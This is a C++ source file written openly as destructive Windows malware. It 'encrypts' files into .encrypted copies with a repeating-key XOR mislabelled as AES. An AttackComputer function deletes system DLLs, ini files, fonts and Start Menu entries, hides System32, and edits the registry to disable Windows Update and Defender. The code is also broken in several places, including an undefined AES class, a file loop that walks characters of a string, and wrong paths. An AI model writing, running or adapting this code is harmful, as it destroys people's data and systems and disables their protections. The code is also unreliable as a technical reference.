#include  <fstream> 
#include  <iostream>
#include  <windows.h>

const char* ALGORITHM = "AES";
const int BLOCK_SIZE = 16;
const int KEY_LENGTH = 32;

void EncryptFile(const std::string& file_path, const std::string& key)
{
    std::ifstream file(file_path);
    if (!file.is_open())
    {
        return;
    }

    std::ofstream encrypted_file(file_path + ".encrypted");
    if (!encrypted_file.is_open())
    {
        return;
    }

    AES aes_algorithm;
    aes_algorithm.Key = key;

    unsigned char block[BLOCK_SIZE];
    while (file.read((char*)block, BLOCK_SIZE))
    {
        for (int i = 0; i < BLOCK_SIZE; i++)
        {
            block[i] ^= aes_algorithm.Key[i % KEY_LENGTH];
        }
        encrypted_file.write((char*)block, BLOCK_SIZE);
    }

    file.close();
    encrypted_file.close();
}

void AttackComputer()
{
    // This function will make the computer unusable by deleting important files and changing system settings.
    std::ofstream system_settings("system.ini");
    if (system_settings.is_open())
    {
        system_settings << "1 = 0" << std::endl;
        system_settings.close();
    }

    std::ifstream windows_registry("windows.reg");
    if (windows_registry.is_open())
    {
        system("rundll32.exe shell32.dll,Control_RunDLL16 'C:\\Windows\\system.ini'");
        windows_registry.close();
    }

    // Delete all system files
    system("del /q C:\\Windows\\ntdll.dll");
    system("del /q C:\\Windows\\kernel32.dll");

    // Change system settings
    system("reg add HKCU\\ControlPanel\\Personalization /v Wallpaper /t REG_SZ /d %SystemRoot%\\system.ini");

    // Delete important files
    system("del /q C:\\Windows\\system.ini");
    system("del /q C:\\Windows\\win.ini");
    system("del /q C:\\Windows\\autoexec.bat");

    // Make system folders unreadable
    system("attrib +r C:\\Windows\\System32");
    system("attrib +h C:\\Windows\\System32");

    // Delete all fonts
    system("del /q C:\\Windows\\Fonts\\*.*");

    // Delete all icons
    system("del /q C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs");

    // Disable Windows Update
    system("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsUpdate /v Disable /t REG_DWORD /d 1");

    // Disable Defender
    system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows Defender /v Enable /t REG_DWORD /d 0");
}

int main()
{
    const char* key = "my_secret_key";
    for (char* file_path = ".\\"; *file_path != '\0'; ++file_path)
    {
        if (*file_path == '.')
        {
            continue;
        }
        std::string file_name(file_path);
        EncryptFile(file_name, key);
    }

    AttackComputer();
    return 0;
}
